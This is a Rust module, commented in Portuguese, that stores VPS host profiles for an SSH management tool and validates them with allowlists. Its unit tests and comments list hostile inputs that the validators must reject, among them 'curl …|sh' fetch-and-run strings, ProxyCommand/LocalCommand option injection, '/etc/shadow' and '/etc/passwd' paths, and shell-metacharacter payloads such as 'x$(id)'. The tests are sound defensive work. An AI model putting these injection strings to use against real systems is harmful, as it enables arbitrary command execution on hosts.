//! REGISTRO de hosts — o perfil de uma VPS e seu CRUD.
//! O quê: `VpsProfile` (alias, endereço, chave gerenciada, ambiente, fingerprint pinada,
//! modo de política) e as operações de listar/salvar/buscar/remover na tabela `hosts`.
//! Onde: `schematize vps add|list|rm`, a tela de VPS da GUI, e todo consumidor de conexão
//! (`conexao`, `exec`, `politica`) — o perfil é a FONTE ÚNICA da conexão (ADR-0006 emenda 1:
//! o `~/.ssh/config` do usuário não entra, `-F none`).
//!
//! **Falha fechada na leitura:** valor de `ambiente`/`modo` desconhecido ou ausente no banco
//! assume o MAIS RESTRITIVO (`Prd` / `ReadOnly`). A direção importa: um registro corrompido
//! deve travar pedindo confirmação, nunca liberar shell livre em produção.

use super::capacidade::Fronteira;
use super::db;
use rusqlite::{params, Connection, OptionalExtension};

/// Ambiente do host — governa o rigor da política (`Prd` exige confirmação humana sempre).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Ambiente {
    Dev,
    Hml,
    Prd,
}

impl Ambiente {
    /// Texto canônico gravado no banco.
    ///
    /// **Onde:** `salvar` e a exibição no CLI/GUI.
    pub fn as_str(self) -> &'static str {
        match self {
            Ambiente::Dev => "dev",
            Ambiente::Hml => "hml",
            Ambiente::Prd => "prd",
        }
    }

    /// Interpreta texto vindo do banco, do CLI ou da GUI. **Falha fechada: o que não for
    /// reconhecido vira `Prd`** — o mais restritivo.
    ///
    /// **Onde:** leitura de linha do banco e parsing do `--env` no CLI.
    pub fn from_raw(s: &str) -> Ambiente {
        match s.trim().to_ascii_lowercase().as_str() {
            "dev" | "local" | "desenvolvimento" => Ambiente::Dev,
            "hml" | "homolog" | "homologacao" | "homologação" | "staging" | "stg" => {
                Ambiente::Hml
            }
            // "prd", "prod", "production" e QUALQUER outra coisa: o mais restritivo.
            _ => Ambiente::Prd,
        }
    }
}

/// Quanto o cliente deixa passar antes de pedir confirmação.
///
/// Lembrete que o `mod.rs` já dá e que vale repetir onde a decisão é tomada: isto é **UX,
/// não fronteira de segurança** (ADR-0005). `Livre` não significa "seguro"; significa "o
/// cliente não opina" — quem recusa de verdade é o forced command no servidor.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ModoPolitica {
    /// Só comandos de leitura conhecidos; o resto é `Deny`.
    ReadOnly,
    /// Só verbos do catálogo do ops (Fase 2); fora do catálogo é `Deny`.
    OpsVerbs,
    /// Sem allowlist — ainda passa pela denylist catastrófica e pelo gate de `Prd`.
    Livre,
}

impl ModoPolitica {
    /// Texto canônico gravado no banco.
    pub fn as_str(self) -> &'static str {
        match self {
            ModoPolitica::ReadOnly => "readonly",
            ModoPolitica::OpsVerbs => "opsverbs",
            ModoPolitica::Livre => "livre",
        }
    }

    /// Interpreta texto. **Falha fechada: desconhecido vira `ReadOnly`.**
    pub fn from_raw(s: &str) -> ModoPolitica {
        match s.trim().to_ascii_lowercase().as_str() {
            "livre" | "free" => ModoPolitica::Livre,
            "opsverbs" | "ops" | "verbos" => ModoPolitica::OpsVerbs,
            _ => ModoPolitica::ReadOnly,
        }
    }
}

/// O perfil de uma VPS: tudo que define uma conexão, sem herdar nada do ambiente.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct VpsProfile {
    /// Nome curto pelo qual o host é chamado (`schematize vps exec <alias>`).
    pub alias: String,
    /// Endereço (IP ou DNS).
    pub host: String,
    /// Porta do sshd.
    pub port: u16,
    /// Usuário remoto.
    pub usuario: String,
    /// Nome da chave gerenciada em `~/.ssh` (o módulo `sshkeys`). Só o NOME — a privada
    /// nunca é lida, só referenciada por caminho em `ssh -i`.
    pub key_name: String,
    /// `ProxyJump` explícito (`user@bastion`), quando houver. Explícito porque o
    /// `~/.ssh/config` não é lido (ADR-0006 emenda 1).
    pub jump: Option<String>,
    /// Ambiente — governa o gate de confirmação.
    pub ambiente: Ambiente,
    /// Fingerprint da host key, pinada. `None` = ainda não confiada.
    pub fingerprint: Option<String>,
    /// Modo da política do cliente.
    pub modo: ModoPolitica,
    /// Opções `-o` extras por host, pro que o perfil não cobre.
    pub extra_opts: Vec<String>,
    /// Que nível de fronteira este host tem HOJE — descoberto por sondagem, não declarado.
    /// Ver [`Fronteira`]: nem todo host aguenta o mesmo, e o app fica com o melhor de cada um.
    pub fronteira: Fronteira,
    /// Quando a última sondagem rodou (epoch secs); 0 = nunca sondado.
    pub sondado_em: i64,
}

impl VpsProfile {
    /// Perfil novo com os defaults mais restritivos: `Prd` + `ReadOnly` + sem fronteira.
    ///
    /// **Onde:** `vps add` e a GUI. O default restritivo é deliberado — quem quiser menos
    /// rigor declara, e a declaração fica no registro.
    pub fn novo(alias: &str, host: &str, usuario: &str, key_name: &str) -> Self {
        VpsProfile {
            alias: alias.to_string(),
            host: host.to_string(),
            port: 22,
            usuario: usuario.to_string(),
            key_name: key_name.to_string(),
            jump: None,
            ambiente: Ambiente::Prd,
            fingerprint: None,
            modo: ModoPolitica::ReadOnly,
            extra_opts: Vec::new(),
            fronteira: Fronteira::Sem,
            sondado_em: 0,
        }
    }
}

/// Nomes de dispositivo reservados do Windows. Um arquivo com qualquer um destes nomes (com
/// ou sem extensão, em qualquer caixa) não é arquivo: é um device. `known_hosts/CON` escreveria
/// no console em vez do disco, e o host ficaria eternamente "não confiado" sem explicação.
///
/// **Onde:** [`valid_alias`]. Vale mesmo no Linux: o registro é sincronizado entre máquinas, e
/// o público-alvo do app é majoritariamente Windows/macOS — um alias criado no Linux não pode
/// quebrar quando o mesmo perfil abrir no Windows. Achado no pentest (P1).
const RESERVADOS_WINDOWS: &[&str] = &[
    "con", "prn", "aux", "nul", "com1", "com2", "com3", "com4", "com5", "com6", "com7", "com8",
    "com9", "lpt1", "lpt2", "lpt3", "lpt4", "lpt5", "lpt6", "lpt7", "lpt8", "lpt9",
];

/// Opções `-o` do ssh que este app aceita em `extra_opts` — **allowlist, deny-by-default**.
///
/// A checagem anterior era "sem espaço", e isso deixava passar
/// `ProxyCommand=curl|sh` — que o ssh executa. Achado no pentest (P3): a opção entrava no
/// argv como `-o ProxyCommand=…` e virava execução arbitrária de comando na máquina LOCAL,
/// contornando por inteiro a política e a fronteira do servidor.
///
/// Só entram aqui opções de **ajuste de transporte**: nenhuma que execute programa, defina
/// caminho de arquivo ou mexa em autenticação. Se faltar alguma, acrescentar é uma linha —
/// e uma decisão consciente, que é o ponto.
const OPCOES_PERMITIDAS: &[&str] = &[
    "serveraliveinterval",
    "serveralivecountmax",
    "connecttimeout",
    "connectionattempts",
    "compression",
    "tcpkeepalive",
    "ipqos",
    "addressfamily",
    "bindinterface",
    "ciphers",
    "macs",
    "kexalgorithms",
    "hostkeyalgorithms",
    "pubkeyacceptedalgorithms",
    "loglevel",
    "requesttty",
    "sessiontype",
    "streamlocalbindmask",
];

/// Valida uma opção `-o` de `extra_opts`. Forma `Chave=valor`, chave na allowlist, sem espaço.
///
/// **Onde:** [`salvar`]. **Erros:** mensagem que diz quais opções existem, em vez de só negar.
pub fn valid_opcao(o: &str) -> Result<(), String> {
    if o.is_empty() || o.contains(char::is_whitespace) || o.contains('\0') {
        return Err(format!("opção inválida: {o:?} (use a forma Chave=valor, sem espaço)"));
    }
    let Some((chave, _)) = o.split_once('=') else {
        return Err(format!("opção inválida: {o:?} (falta o `=`)"));
    };
    let k = chave.trim().to_ascii_lowercase();
    if !OPCOES_PERMITIDAS.contains(&k.as_str()) {
        return Err(format!(
            "opção {chave:?} não é permitida. O app só aceita ajuste de transporte, nunca opção que execute programa (ProxyCommand, LocalCommand, Match) — elas rodariam na SUA máquina, contornando a política e a fronteira do servidor. Permitidas: {}",
            OPCOES_PERMITIDAS.join(", ")
        ));
    }
    Ok(())
}

/// Valida o `$HOME` que o HOST informou, antes de ele virar caminho no script de bootstrap.
///
/// **O quê:** exige caminho absoluto POSIX, ASCII, com teto, e recusa aspas, `$`, crase, `;`
/// e afins. **Onde:** `bootstrap::instalar`, sobre `Sondagem::home`.
///
/// **Por que existe:** este é o único valor do módulo que vem de FORA e vai parar numa linha
/// de comando — e vinha sem validação nenhuma. Todo campo do perfil (alias, host, usuário,
/// chave, `-o`) passa por um validador porque cai no argv do `ssh`; o `home` cai no SCRIPT
/// que o `sh` do host interpreta, o que é a mesma coisa com uma camada a mais.
///
/// No `script_de_instalacao` ele é interpolado dentro de aspas SIMPLES (`mkdir -p '{dir}'`).
/// Um `'` no valor fecha a citação e o resto da linha vira comando. Quem fornece o valor é o
/// próprio servidor, então o alcance é o host que já o forneceu — não há salto pra máquina
/// de quem roda o app, e `sond.home` não é usado em mais lugar nenhum (conferido). Não é,
/// portanto, escalada de privilégio.
///
/// **Ainda assim vale barrar**, por três motivos. No caminho `OpsShellRoot` o texto injetado
/// fica encostado num `sudo -n` — e "encostado no sudo" é coisa que não se quer ter de
/// reanalisar a cada refatoração. É a única exceção num módulo que valida todo o resto, e
/// exceção sem motivo escrito é o que vira precedente. E a validação custa dez linhas.
pub fn valid_home_remoto(h: &str) -> Result<(), String> {
    let ruim = |porque: &str| {
        Err(format!(
            "o host informou um $HOME que não dá pra usar ({porque}): {:?}. \
             Ele entra no script de instalação, então só aceito caminho absoluto simples.",
            resumir(h)
        ))
    };
    if h.is_empty() || h.len() > 256 {
        return ruim("vazio ou longo demais");
    }
    if !h.starts_with('/') {
        return ruim("não é absoluto");
    }
    if h.contains("..") {
        return ruim("contém `..`");
    }
    if !h.chars().all(|c| c.is_ascii_alphanumeric() || "/._-".contains(c)) {
        return ruim("tem caractere fora de [A-Za-z0-9/._-]");
    }
    Ok(())
}

/// Encurta um valor para aparecer numa mensagem de erro.
///
/// Sem isto, `alias de VPS inválido: {alias:?}` com um alias de 300 MB devolvia uma mensagem de
/// 300 MB — a resposta ficava MAIOR que a entrada, o que transforma validação em amplificação
/// de DoS. Achado no teste destrutivo. O limite é generoso o bastante para a mensagem seguir
/// útil em qualquer caso real.
pub fn resumir(v: &str) -> String {
    const TETO: usize = 120;
    if v.chars().count() <= TETO {
        return v.to_string();
    }
    let cabeca: String = v.chars().take(TETO).collect();
    format!("{cabeca}… ({} caracteres no total)", v.chars().count())
}

/// Valida o alias — deny-by-default, na mesma disciplina de `sshkeys::valid_name`.
///
/// Recusa vazio, >64, `..`, `/`, `\`, início não-alfanumérico e qualquer caractere fora de
/// `[A-Za-z0-9._-]`. **Onde:** toda escrita no registro e todo lookup, pra que um alias
/// nunca vire caminho, flag do `ssh` (`-o…`) nem argumento de shell.
pub fn valid_alias(alias: &str) -> Result<(), String> {
    let bad = || {
        Err(format!(
            "alias de VPS inválido: {:?} (use letras, números, '.', '_' ou '-', começando por letra ou número)",
            resumir(alias)
        ))
    };
    if alias.is_empty() || alias.len() > 64 {
        return bad();
    }
    if alias.contains("..") || alias.contains('/') || alias.contains('\\') {
        return bad();
    }
    match alias.chars().next() {
        Some(c) if c.is_ascii_alphanumeric() => {}
        _ => return bad(),
    }
    if !alias.chars().all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-')) {
        return bad();
    }
    // Nome reservado do Windows — com ou sem extensão (`con`, `CON.txt`).
    let base = alias.split('.').next().unwrap_or(alias).to_ascii_lowercase();
    if RESERVADOS_WINDOWS.contains(&base.as_str()) {
        return Err(format!(
            "alias {alias:?} é um nome de dispositivo reservado do Windows — no Windows ele não vira arquivo, e o registro deste host ficaria quebrado sem aviso. Escolha outro nome (ex.: {alias}-01)"
        ));
    }
    Ok(())
}

/// Valida o endereço do host. Falha fechada: não-vazio, ASCII imprimível, sem espaço e **sem
/// começar por `-`** (senão o `ssh` o leria como opção — injeção de flag).
///
/// **Valida a string EXATA que será gravada, não uma cópia aparada.** A versão anterior fazia
/// `host.trim()` e checava isso — então `"10.0.0.1\n"` passava e ia inteiro para o banco e
/// para o argv do `ssh`, com o `\n` junto. Achado no fuzzing: validar uma coisa e guardar
/// outra é como a maioria dos bypass de validação nasce.
///
/// Não apara em silêncio de propósito: o que o usuário digitou tem que ser o que fica gravado,
/// ou a mensagem de erro dele deixa de fazer sentido.
///
/// **Onde:** `salvar`, antes de qualquer linha entrar no banco; e o usuário remoto.
pub fn valid_host(host: &str) -> Result<(), String> {
    // Teto de tamanho: um FQDN cabe em 253 caracteres (RFC 1035), e `user@host` idem na
    // prática. Sem teto, um "host" de megabytes era aceito, ia pro banco, e só falhava lá na
    // frente no `execve` (ARG_MAX) com um erro que não ajuda ninguém. Achado no teste
    // destrutivo — pelo próprio teste que cobrava o teto das MENSAGENS de erro.
    const MAX: usize = 253;
    if host.len() > MAX {
        return Err(format!(
            "endereço de host inválido: tem {} caracteres, o máximo é {MAX} (um FQDN não passa disso)",
            host.len()
        ));
    }
    if host.is_empty() || host.starts_with('-') {
        return Err(format!(
            "endereço de host inválido: {:?} (vazio, ou começa por '-' e o ssh o leria como opção)",
            resumir(host)
        ));
    }
    if host.chars().any(|c| c.is_whitespace()) {
        return Err(format!(
            "endereço de host inválido: {:?} — tem espaço, tabulação ou quebra de linha (inclusive no começo ou no fim)", resumir(host)
        ));
    }
    // ALLOWLIST, não "ASCII imprimível".
    //
    // A versão anterior aceitava qualquer `is_ascii_graphic()`, o que inclui crase, `$`,
    // `;`, `|`, `>`, aspas e parênteses. Era o ÚNICO validador desta família por negação —
    // `valid_alias`, `valid_opcao` e `valid_home_remoto` são todos por allowlist — e este
    // valida TRÊS campos: `host`, `usuario` e `jump`.
    //
    // Não era explorável: todo consumidor de hoje usa `argv` (`ssh_args_puro`,
    // `util::run("ssh-keyscan", …)`) ou aspas simples com escape `'\''`
    // (`abrir_no_terminal`), e dentro de aspas simples crase e `$` são inertes.
    //
    // Foi corrigido assim mesmo porque a garantia estava no CONSUMIDOR, não no dado: quem
    // acrescentasse um caminho que montasse string de shell herdaria o buraco sem saber que
    // o herdou. Validar na fronteira existe justamente pra não ter de re-auditar cada
    // consumidor a cada mudança.
    //
    // O conjunto cobre o que é legítimo nos três campos: FQDN e punycode (`xn--…`), IPv4,
    // **IPv6 com `:` e colchetes**, usuário Linux (`.`, `_`, `-`), e `jump` na forma
    // `[user@]host[:port]` (daí o `@`).
    //
    // Não-ASCII segue de fora por homóglifo: `googlе.com` com `е` cirílico é outro domínio
    // e ninguém vê a diferença — nome internacionalizado entra em punycode.
    const PERMITIDOS: &str = ".-_:@[]";
    if let Some(c) = host.chars().find(|c| !c.is_ascii_alphanumeric() && !PERMITIDOS.contains(*c)) {
        return Err(format!(
            "endereço de host inválido: {:?} — o caractere {c:?} não é aceito. Use letras, números e `{PERMITIDOS}` (FQDN, IPv4, IPv6 com colchetes, ou punycode `xn--…`)",
            resumir(host)
        ));
    }
    Ok(())
}

/// Grava (insere ou substitui) um perfil. Valida alias, host, usuário e chave antes.
///
/// **Onde:** `vps add`, edição pela GUI, e `conexao::pinar_fingerprint` ao confiar num host.
pub fn salvar(conn: &Connection, p: &VpsProfile) -> Result<(), String> {
    valid_alias(&p.alias)?;
    valid_host(&p.host)?;
    // O usuário remoto segue a mesma disciplina do host (sem espaço, sem flag, ASCII, com
    // teto) — é outro campo que vai direto pro argv do `ssh`.
    if p.usuario.len() > 64 {
        return Err(format!(
            "usuário remoto inválido: tem {} caracteres, o máximo é 64",
            p.usuario.len()
        ));
    }
    valid_host(&p.usuario)
        .map_err(|_| format!("usuário remoto inválido: {:?}", resumir(&p.usuario)))?;
    crate::sshkeys::valid_name(&p.key_name)?;
    // Porta 0 não existe como destino: o `ssh` falharia com uma mensagem que não ajuda em nada.
    if p.port == 0 {
        return Err("porta inválida: 0 (use 22, ou a porta em que o sshd escuta)".into());
    }
    if let Some(j) = &p.jump {
        valid_host(j).map_err(|_| format!("jump host inválido: {j:?}"))?;
    }
    for o in &p.extra_opts {
        valid_opcao(o)?;
    }
    conn.execute(
        "INSERT INTO hosts (alias, host, port, usuario, key_name, jump, ambiente, fingerprint,
                            modo, extra_opts, shim, criado_em, fronteira, sondado_em)
         VALUES (?1,?2,?3,?4,?5,?6,?7,?8,?9,?10,?11,?12,?13,?14)
         ON CONFLICT(alias) DO UPDATE SET
            host=?2, port=?3, usuario=?4, key_name=?5, jump=?6, ambiente=?7,
            fingerprint=?8, modo=?9, extra_opts=?10, shim=?11, fronteira=?13,
            sondado_em=?14",
        params![
            p.alias,
            p.host,
            p.port,
            p.usuario,
            p.key_name,
            p.jump,
            p.ambiente.as_str(),
            p.fingerprint,
            p.modo.as_str(),
            p.extra_opts.join(" "),
            p.fronteira.e_server_side() as i64, // coluna legada `shim`, mantida por compat
            db::agora_secs(),
            p.fronteira.as_str(),
            p.sondado_em,
        ],
    )
    .map_err(|e| format!("falha ao gravar o host {:?}: {e}", p.alias))?;
    Ok(())
}

/// Busca um perfil pelo alias. `Ok(None)` quando não existe — ausência não é erro.
///
/// **Onde:** todo comando que recebe um alias (`exec`, `logs`, `policy`, `authorize`).
pub fn buscar(conn: &Connection, alias: &str) -> Result<Option<VpsProfile>, String> {
    valid_alias(alias)?;
    conn.query_row(
        "SELECT alias, host, port, usuario, key_name, jump, ambiente, fingerprint, modo,
                extra_opts, fronteira, sondado_em
           FROM hosts WHERE alias = ?1",
        params![alias],
        linha_para_perfil,
    )
    .optional()
    .map_err(|e| format!("falha ao ler o host {alias:?}: {e}"))
}

/// Lista todos os perfis, em ordem alfabética de alias.
///
/// **Onde:** `vps list` e a tela de VPS da GUI.
pub fn listar(conn: &Connection) -> Result<Vec<VpsProfile>, String> {
    let mut stmt = conn
        .prepare(
            "SELECT alias, host, port, usuario, key_name, jump, ambiente, fingerprint, modo,
                    extra_opts, fronteira, sondado_em
               FROM hosts ORDER BY alias",
        )
        .map_err(|e| format!("falha ao preparar a listagem: {e}"))?;
    let it =
        stmt.query_map([], linha_para_perfil).map_err(|e| format!("falha ao listar hosts: {e}"))?;
    let mut out = Vec::new();
    for r in it {
        // Linha corrompida não pode derrubar a listagem inteira (piso 10): reporta e segue.
        match r {
            Ok(p) => out.push(p),
            Err(e) => eprintln!("aviso: linha de host ilegível no vps.db, ignorada: {e}"),
        }
    }
    Ok(out)
}

/// Remove um perfil. **Não** remove a auditoria dele — o log é append-only e sobrevive ao
/// host (é justamente quando um host some que o histórico importa).
///
/// **Onde:** `vps rm` e o botão de remover da GUI (com confirmação).
pub fn remover(conn: &Connection, alias: &str) -> Result<bool, String> {
    valid_alias(alias)?;
    let n = conn
        .execute("DELETE FROM hosts WHERE alias = ?1", params![alias])
        .map_err(|e| format!("falha ao remover o host {alias:?}: {e}"))?;
    Ok(n > 0)
}

/// Converte uma linha da tabela `hosts` num [`VpsProfile`], aplicando a falha fechada de
/// `ambiente`/`modo`.
///
/// **Onde:** `buscar` e `listar` — ponto único de leitura, pra que a falha fechada não tenha
/// como ser esquecida num dos dois.
fn linha_para_perfil(r: &rusqlite::Row) -> rusqlite::Result<VpsProfile> {
    let extra: String = r.get(9)?;
    Ok(VpsProfile {
        alias: r.get(0)?,
        host: r.get(1)?,
        port: r.get::<_, i64>(2)? as u16,
        usuario: r.get(3)?,
        key_name: r.get(4)?,
        jump: r.get(5)?,
        ambiente: Ambiente::from_raw(&r.get::<_, String>(6)?),
        fingerprint: r.get(7)?,
        modo: ModoPolitica::from_raw(&r.get::<_, String>(8)?),
        extra_opts: extra.split_whitespace().map(str::to_string).collect(),
        fronteira: Fronteira::from_raw(&r.get::<_, String>(10)?),
        sondado_em: r.get(11)?,
    })
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::vps::db_de_teste;

    /// O `$HOME` que o host informa vira caminho no script de bootstrap — e o script é
    /// interpretado por um `sh` do outro lado. Quebra de citação morre antes de virar texto.
    /// `valid_host` é allowlist, não "ASCII imprimível" — e vale para os TRÊS campos que
    /// passam por ele (`host`, `usuario`, `jump`).
    ///
    /// **De onde veio:** o fuzzing adversarial da camada 3/4 do Q.A. de 2026-09-01, que
    /// afirma a regra sobre a família inteira de validadores em vez de exemplo a exemplo.
    /// Ele pegou `` x`id` `` sendo ACEITO — não explorável com os consumidores de hoje
    /// (todos usam argv ou aspas simples com escape), mas a garantia estava no consumidor e
    /// não no dado.
    #[test]
    fn host_so_aceita_o_que_e_endereco() {
        for veneno in [
            "x`id`", "x$(id)", "x;id", "x|id", "x>arq", "x<arq", "x&", "x'y", "x\"y", "x(y)",
            "x{y}", "x*", "x?", "x\\y", "x!y", "x#y", "x%y", "x^y", "x~y", "x+y", "x=y", "x,y",
            "x/y",
        ] {
            assert!(valid_host(veneno).is_err(), "host hostil aceito: {veneno:?}");
        }
        // E o que é endereço de verdade continua passando, nas quatro formas.
        for ok in [
            "srv-01.prod.example.com",   // FQDN
            "10.0.0.5",                  // IPv4
            "2001:db8::1",               // IPv6 cru
            "[2001:db8::1]",             // IPv6 com colchetes
            "xn--brs-yva.example",       // punycode (IDN)
            "deploy",                    // usuário Linux simples
            "ci_bot.v2-a",               // usuário com `.`, `_` e `-`
            "deploy@bastion.example:22", // jump na forma [user@]host[:port]
        ] {
            assert!(valid_host(ok).is_ok(), "endereço legítimo recusado: {ok:?}");
        }
    }

    #[test]
    fn home_do_host_hostil_e_recusado() {
        for veneno in [
            // Fecha a aspa simples de `mkdir -p '{dir}'` e emenda comando.
            "/home/d'; curl http://x|sh; echo '",
            "/home/d\"; id; \"",
            "/home/d`id`",
            "/home/d$(id)",
            "/home/d;id",
            "/home/d|id",
            "/home/d\nid",
            "/home/../../etc",
            "relativo/sem/barra",
            "",
        ] {
            assert!(
                valid_home_remoto(veneno).is_err(),
                "$HOME hostil tinha que ser recusado: {veneno:?}"
            );
        }
        // Acima do teto de 256.
        assert!(valid_home_remoto(&format!("/{}", "a".repeat(256))).is_err());

        // E o legítimo continua passando — inclusive os formatos de BSD e macOS.
        for ok in ["/home/deploy", "/root", "/Users/ana", "/usr/home/bsd", "/home/a.b_c-d"] {
            assert!(valid_home_remoto(ok).is_ok(), "$HOME legítimo recusado: {ok:?}");
        }
    }

    fn conn_de_teste(nome: &str) -> Connection {
        db::open_at(&db_de_teste(nome)).unwrap()
    }

    #[test]
    fn crud_round_trip() {
        let c = conn_de_teste("crud");
        let mut p = VpsProfile::novo("srv-01", "10.0.0.5", "deploy", "id_ed25519");
        p.ambiente = Ambiente::Hml;
        p.modo = ModoPolitica::OpsVerbs;
        p.port = 2222;
        p.jump = Some("bastion@borda.example".into());
        p.extra_opts = vec!["ServerAliveInterval=30".into()];
        salvar(&c, &p).expect("salvar");

        let lido = buscar(&c, "srv-01").unwrap().expect("host existe");
        assert_eq!(lido, p, "round-trip precisa devolver o perfil idêntico");

        // update: salvar de novo com o mesmo alias substitui, não duplica.
        let mut p2 = p.clone();
        p2.host = "10.0.0.6".into();
        salvar(&c, &p2).unwrap();
        assert_eq!(listar(&c).unwrap().len(), 1, "salvar duas vezes não pode duplicar");
        assert_eq!(buscar(&c, "srv-01").unwrap().unwrap().host, "10.0.0.6");

        assert!(remover(&c, "srv-01").unwrap());
        assert!(buscar(&c, "srv-01").unwrap().is_none());
        assert!(!remover(&c, "srv-01").unwrap(), "remover o que não existe = false, não erro");
    }

    #[test]
    fn buscar_inexistente_e_none_nao_erro() {
        let c = conn_de_teste("none");
        assert!(buscar(&c, "nao-existe").unwrap().is_none());
        assert!(listar(&c).unwrap().is_empty());
    }

    #[test]
    fn alias_invalido_e_recusado_deny_by_default() {
        // Válidos.
        for ok in ["srv", "srv-01.prod", "a", "S3rv_01", &"x".repeat(64)] {
            assert!(valid_alias(ok).is_ok(), "{ok:?} deveria passar");
        }
        // Inválidos — nada que escape, vire flag ou vire caminho.
        for bad in [
            "",
            "../evil",
            "a/b",
            "a\\b",
            ".oculto",
            "-flag",
            "foo..bar",
            "com espaco",
            "CON",
            "con",
            "nul",
            "AUX",
            "com1",
            "LPT9",
            "con.txt",
            "com\ttab",
            "com\nnl",
            "acentuação",
            "emoji🙂",
            "a;b",
            "a|b",
            "a$b",
            "a`b",
            "-o ProxyCommand=x",
            "a\0b",
        ] {
            assert!(valid_alias(bad).is_err(), "{bad:?} deveria ser recusado");
        }
        assert!(valid_alias(&"x".repeat(65)).is_err(), "longo demais");
    }

    #[test]
    fn host_que_comeca_por_hifen_e_injecao_de_flag() {
        assert!(valid_host("-oProxyCommand=curl evil.sh|sh").is_err());
        assert!(valid_host("").is_err());
        assert!(valid_host("com espaco").is_err());
        assert!(valid_host("10.0.0.5").is_ok());
        assert!(valid_host("srv.example.com").is_ok());
        assert!(valid_host("xn--80ak6aa92e.com").is_ok(), "IDN em punycode é ASCII e passa");
        // Achados no fuzzing: validar o trim e gravar o original é bypass de validação.
        for bad in [
            "10.0.0.1\n",
            "\t10.0.0.1",
            " 10.0.0.1 ",
            "10.0.0.1\r",
            "goog\u{0435}le.com",
            "srv\u{200b}.com",
        ] {
            assert!(valid_host(bad).is_err(), "{bad:?} tinha que ser recusado");
        }
        // Teto de tamanho (D9): sem ele, um "host" de megabytes ia pro banco e só falhava no
        // `execve`, com um erro incompreensível.
        assert!(valid_host(&"a".repeat(253)).is_ok());
        assert!(valid_host(&"a".repeat(254)).is_err());
        assert!(valid_host(&"a".repeat(5 * 1024 * 1024)).is_err());
    }

    #[test]
    fn salvar_recusa_entrada_hostil() {
        let c = conn_de_teste("hostil");
        let mut p = VpsProfile::novo("ok", "10.0.0.5", "deploy", "k");
        p.alias = "../fuga".into();
        assert!(salvar(&c, &p).is_err(), "alias que escapa");

        let mut p = VpsProfile::novo("ok", "-oProxyCommand=x", "deploy", "k");
        assert!(salvar(&c, &p).is_err(), "host como flag");

        p = VpsProfile::novo("ok", "10.0.0.5", "-l root", "k");
        assert!(salvar(&c, &p).is_err(), "usuário com espaço/flag");

        p = VpsProfile::novo("ok", "10.0.0.5", "deploy", "../../etc/passwd");
        assert!(salvar(&c, &p).is_err(), "chave que escapa de ~/.ssh");

        p = VpsProfile::novo("ok", "10.0.0.5", "deploy", "k");
        p.extra_opts = vec!["ProxyCommand=curl x | sh".into()];
        assert!(salvar(&c, &p).is_err(), "opção extra com espaço vira argv extra");

        // P3 do pentest: SEM espaço, `ProxyCommand` passava e virava execução arbitrária
        // na máquina local, contornando política e fronteira.
        for veneno in [
            "ProxyCommand=touch/tmp/OWNED",
            "LocalCommand=id",
            "PermitLocalCommand=yes",
            "KnownHostsCommand=/bin/sh",
            "IdentityFile=/etc/shadow",
            "UserKnownHostsFile=/dev/null",
            "StrictHostKeyChecking=no",
            "-D",
            "semigual",
        ] {
            let mut p = VpsProfile::novo("ok", "10.0.0.5", "deploy", "k");
            p.extra_opts = vec![veneno.into()];
            assert!(salvar(&c, &p).is_err(), "extra_opt {veneno:?} tinha que ser recusado");
        }
        // E o ajuste legítimo continua passando.
        let mut p = VpsProfile::novo("ok", "10.0.0.5", "deploy", "k");
        p.extra_opts = vec!["ServerAliveInterval=30".into(), "ConnectTimeout=20".into()];
        assert!(salvar(&c, &p).is_ok(), "ajuste de transporte legítimo tem que passar");

        p = VpsProfile::novo("ok", "10.0.0.5", "deploy", "k");
        p.jump = Some("-oProxyCommand=x".into());
        assert!(salvar(&c, &p).is_err(), "jump como flag");
    }

    #[test]
    fn ambiente_desconhecido_falha_fechada_em_prd() {
        assert_eq!(Ambiente::from_raw("dev"), Ambiente::Dev);
        assert_eq!(Ambiente::from_raw("HML"), Ambiente::Hml);
        assert_eq!(Ambiente::from_raw("prd"), Ambiente::Prd);
        // O ponto do teste: qualquer coisa fora do rol é tratada como produção.
        for x in ["", "  ", "qa", "sandbox", "lixo", "PRODUCTION", "\0"] {
            assert_eq!(Ambiente::from_raw(x), Ambiente::Prd, "{x:?} tem que cair em Prd");
        }
    }

    #[test]
    fn modo_desconhecido_falha_fechada_em_readonly() {
        assert_eq!(ModoPolitica::from_raw("livre"), ModoPolitica::Livre);
        assert_eq!(ModoPolitica::from_raw("opsverbs"), ModoPolitica::OpsVerbs);
        for x in ["", "qualquer", "admin", "root", "LIVRE-ish"] {
            assert_eq!(ModoPolitica::from_raw(x), ModoPolitica::ReadOnly, "{x:?}");
        }
    }

    #[test]
    fn perfil_novo_nasce_no_default_mais_restritivo() {
        let p = VpsProfile::novo("a", "h", "u", "k");
        assert_eq!(p.ambiente, Ambiente::Prd);
        assert_eq!(p.modo, ModoPolitica::ReadOnly);
        assert_eq!(p.fronteira, Fronteira::Sem, "host novo não tem fronteira até PROVAR que tem");
        assert_eq!(p.sondado_em, 0);
        assert!(p.fingerprint.is_none(), "host novo não é confiado por default");
    }
}
